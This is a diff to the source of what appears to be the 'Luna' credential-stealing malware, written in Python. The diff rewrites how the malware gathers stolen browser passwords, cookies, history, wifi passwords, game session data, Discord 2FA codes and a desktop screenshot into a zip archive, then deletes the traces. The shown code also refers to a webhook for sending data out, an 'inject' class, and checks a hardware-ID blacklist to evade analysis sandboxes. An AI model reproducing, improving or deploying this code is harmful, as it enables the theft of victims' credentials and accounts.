@@ -62,7 +62,7 @@ def Luna(webhook: str):
     for proc in procs:
         proc(webhook)
 
-    cleanup()
+    os.remove(f'Luna-Logged-{os.getenv("Username")}.zip')
 
 def try_extract(func):
     def wrapper(*args, **kwargs):
@@ -545,30 +545,23 @@ class mfa_codes():
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
-            zipf.write("browser-passwords.txt")
-            zipf.write("browser-cookies.txt")
-            zipf.write("browser-history.txt")
-            zipf.write("wifi-passwords.txt")
-            zipf.write("minecraft-sessioninfo.json")
-            zipf.write("minecraft-usercache.json")
-            zipf.write("epicgames-data.txt")
-            zipf.write("discord-2fa-codes.txt")
-            zipf.write("desktop-screenshot.png")
-
-def cleanup():
-    try:
-        os.remove("browser-passwords.txt"),
-        os.remove("browser-cookies.txt"),
-        os.remove("browser-history.txt"),
-        os.remove("wifi-passwords.txt"),
-        os.remove("minecraft-usercache.json"),
-        os.remove("minecraft-sessioninfo.json"),
-        os.remove("epicgames-data.txt"),
-        os.remove("discord-2fa-codes.txt"),
-        os.remove("desktop-screenshot.png"),
-        os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")
-    except Exception:
-        pass
+        files = [
+            "browser-passwords.txt",
+            "browser-cookies.txt", 
+            "browser-history.txt",
+            "wifi-passwords.txt",
+            "minecraft-sessioninfo.json", 
+            "minecraft-usercache.json",
+            "epicgames-data.txt",
+            "discord-2fa-codes.txt",  
+            "desktop-screenshot.png"
+            ]
+        for file in files:
+            if os.path.exists(file):
+                zipf.write(file)
+                os.remove(file)
+            else:
+                pass
 
 class inject:
     def __init__(self, webhook: str):
@@ -675,7 +668,7 @@ class debug:
 
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
 
         if hwid in self.blackListedHWIDS:
             return True
